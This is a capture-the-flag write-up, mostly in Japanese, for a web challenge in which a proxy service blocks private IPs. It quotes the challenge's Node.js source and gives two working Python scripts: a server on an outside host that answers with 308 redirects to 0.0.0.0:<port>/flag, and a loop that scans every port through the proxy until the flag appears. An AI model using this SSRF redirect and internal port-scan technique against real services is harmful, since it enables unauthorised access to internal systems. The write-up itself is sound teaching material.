# School Unblocker:Web:130pts
Clam was just trying to browse kevinhiggs.com when his school wifi suddenly blocked it! So, he wrote [a proxy service](https://school-unblocker.web.actf.co/) so he can view his favorite website again! Can you get the flag hidden behind it?  

[Source](index.js)  

# Solution
サイトとソースが渡される。  
アクセスすると、プロキシサービスが動いているようだ。  
School Unblocker  
[site.png](site/site.png)  
ソースの主要部分は以下のようであった。  
```JavaScript
function isIpv4(str) {
    const chunks = str.split(".").map(x => parseInt(x, 10));
    return chunks.length === 4 && chunks.every(x => !isNaN(x) && x >= 0 && x < 256);
}

function isPublicIp(ip) {
    const chunks = ip.split(".").map(x => parseInt(x, 10));
    if ([127, 0, 10, 192].includes(chunks[0])) {
        return false;
    }
    if (chunks[0] == 172 && chunks[1] >= 16 && chunks[1] < 32) {
        return false;
    }
    return true;
}
~~~

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/proxy", async (req, res) => {
    try {
        const url = new URL(req.body.url);
        const originalHost = url.host;
        if (!isIpv4(url.hostname)) {
            const ips = await resolve4(url.hostname);
            // no dns rebinding today >:)
            url.hostname = ips[0];
        }
        if (!isPublicIp(url.hostname)) {
            res.type("text/html").send("<p>private ip contents redacted</p>");
        } else {
            const abort = new AbortController();
            setTimeout(() => abort.abort(), 3000);
            const resp = await fetch(url.toString(), {
                method: "POST",
                body: "ping=pong",
                headers: {
                    Host: originalHost,
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                signal: abort.signal,
            });
            res.type("text/html").send(await resp.text());
        }
    } catch (err) {
        res.status(400).type("text/plain").send("got error: " + err.message);
    }
});

// make flag accessible for local debugging purposes only
// also the nginx is at a private ip that isn't 127.0.0.1
// it's not that easy to get the flag :D
app.post("/flag", (req, res) => {
    if (!["127.0.0.1", "::ffff:127.0.0.1"].includes(req.socket.remoteAddress)) {
        res.status(400).type("text/plain").send("You don't get the flag!");
    } else {
        res.type("text/plain").send(flag);
    }
});
~~~
```
`/proxy`でfetchによりサイトを中継しているようだ。  
`/flag`にPOSTすればフラグが得られるが、`isIpv4`や`isPublicIp`が堅牢かつ、`new URL`で`http://0x7F000001`なども通常表記に直される。  
バイパスしてローカルのIPを指定するのは難しそうである。  
ここでfetchがリダイレクトをたどることを思い出す。  
つまり問題サーバのローカルにリダイレクトするグローバルIPを与えてやればよい。  
ここで問題になるのは、サービスが外部からのIPでのアクセスをブロックしており、内部のポートがわからないことだ。  
すべてのポートをスキャンする手法をとる。  
また、POSTである必要があるため、返すステータスコードに注意しGETに変わらないものを選ぶ。  
自前のサーバのグローバルIPを`192.0.2.0`、ポートを`4444`として、構成は以下のようになる。  
```
+------------------+                  +----------------+
|                  | -----fetch-----> | 192.0.2.0:4444 |
| School Unblocker |  <-----308-----  +----------------+       +---------------+
|                  | ------------------POST------------------> | 0.0.0.0:????? |
+------------------+ <------------------flag------------------ +---------------+
```
まずは自前のサーバ側のリダイレクトを以下のproxy.pyで行う。  
```python
import http.server

class handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(308)
        self.send_header("Location", f"http://0.0.0.0:{self.path[1:]}/flag")
        self.end_headers()

with http.server.HTTPServer(("", 4444), handler) as server:
    server.serve_forever()
```
アクセスされたパスを`0.0.0.0`のポートにしてリダイレクトしている。  
ちなみに308はGETに変更されないことが保証されている。  
このプログラムを自前のサーバで起動しておく。  
次にローカルからSchool UnblockerにfetchさせるためのPOSTをするプログラムを以下のaccess.pyのように記述する。  
```python
import requests

url = "https://school-unblocker.web.actf.co/proxy"

port = 65535

while True:
    try:
        res = requests.post(url, data={"url": f"http://192.0.2.0:4444/{port}"}) # redirect server
        text = res.text
        with open("log.txt", "a") as file:
            file.write(f"[{port}]\n{text}\n")
            file.flush()
        if port < 0:
            break
    except :
        with open("log.txt", "a") as file:
            file.write(f"[{port}]\n-----ERROR-----\n")
            file.flush()
    finally:
        port -= 1
```
実行するとスキャンしたポートとその情報が`log.txt`に吐き出される。  
```bash
$ python access.py
$ grep -3 "actf" log.txt
[8081]
got error: request to http://0.0.0.0:8081/flag failed, reason: connect ECONNREFUSED 0.0.0.0:8081
[8080]
actf{dont_authenticate_via_ip_please}
[8079]
got error: request to http://0.0.0.0:8079/flag failed, reason: connect ECONNREFUSED 0.0.0.0:8079
[8078]
```
8080番ポートでflagが得られた。  

## actf{dont_authenticate_via_ip_please}